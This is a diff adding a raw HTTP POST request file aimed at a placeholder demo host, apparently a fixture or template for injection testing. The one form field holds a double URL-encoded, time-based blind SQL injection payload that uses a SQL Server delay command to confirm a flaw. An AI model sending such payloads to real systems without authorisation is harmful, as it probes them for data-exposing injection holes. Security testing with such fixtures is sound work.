@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+Connection: close
+
+page=1%2Bwaitfor%2Bdelay%2B%25270%253A0%253A5%2527--
